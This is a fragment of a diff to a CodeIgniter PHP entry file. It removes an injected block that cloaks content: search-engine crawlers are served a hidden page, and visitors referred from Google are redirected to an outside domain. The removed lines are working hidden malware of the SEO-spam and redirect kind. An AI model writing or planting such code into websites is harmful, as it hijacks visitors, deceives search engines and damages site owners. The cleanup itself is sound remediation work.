@@ -1,57 +1,5 @@
 <?php
 error_reporting(0);
-set_time_limit(0);
-
-$bot_content_file = 'faqq.php';
-
-function is_spider() {
-    $spiders = ['bot', 'slurp', 'spider', 'crawl', 'google', 'msnbot', 'yahoo', 'ask jeeves'];
-    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-        return false;
-    }
-    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
-    foreach ($spiders as $spider) {
-        if (stripos($s_agent, $spider) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-function is_mobile() {
-    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
-        return false;
-    }
-    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
-    return preg_match('/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i', $ua);
-}
-
-function is_from_google() {
-    if (!isset($_SERVER['HTTP_REFERER'])) {
-        return false;
-    }
-    return stripos($_SERVER['HTTP_REFERER'], 'google.') !== false;
-}
-
-if (is_spider()) {
-    if (file_exists($bot_content_file)) {
-        include($bot_content_file);
-    } else {
-        header("HTTP/1.0 404 Not Found");
-        echo "Bot içeriği bulunamadı.";
-    }
-    exit();
-}
-
-if (is_from_google()) {
-    header("Location: https://flymarka208.com.tr");
-    exit();
-}
-
-?>
-
-<?php
-error_reporting(0);
 //session_start();
 /**
  * CodeIgniter
